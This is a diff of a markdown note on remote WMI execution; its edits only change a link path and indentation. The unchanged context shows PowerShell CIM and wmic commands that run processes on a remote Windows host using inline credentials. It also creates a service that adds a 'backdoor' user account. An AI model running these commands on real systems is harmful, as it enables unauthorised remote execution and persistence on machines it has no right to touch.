@@ -1,4 +1,4 @@
-[[WMI]]
+[[Windows/Windows Internals/WMI]]
 # Connecting to WMI on remote machine
 ### Protocols support
 - **DCOM**: RPC over IP. Uses port 135/TCP and port 49152-65535/TCP.
@@ -25,7 +25,7 @@ $session = New-CimSession -ComputerName <SERVER> -Credential $credential -Sessio
 $command = "powershell.exe -Command Set-Content -Path C:\Temp\text.txt -Value Hello,World!";
 
 Invoke-CimMethod -CimSession $session -Classname Win32_Process -MethodName create -Arguments @{
-CommandLine = $command;
+	CommandLine = $command;
 } 
 ```
 ### CMD
@@ -39,11 +39,11 @@ wmic.exe /user:administrator /password:password123 /node:<server> process call c
 ```powershell
 # Create service
 Invoke-CimMethod -CimSession $session -ClassName Win32_Service -MethodName create -Arguments @{
-Name = "MyService";
-DisplayName = "MyService";
-PathName = "net user backdoor password /add";
-ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
-StartMode = "Manual";
+	Name = "MyService";
+	DisplayName = "MyService";
+	PathName = "net user backdoor password /add";
+	ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
+	StartMode = "Manual";
 }
 
 # Create a service object
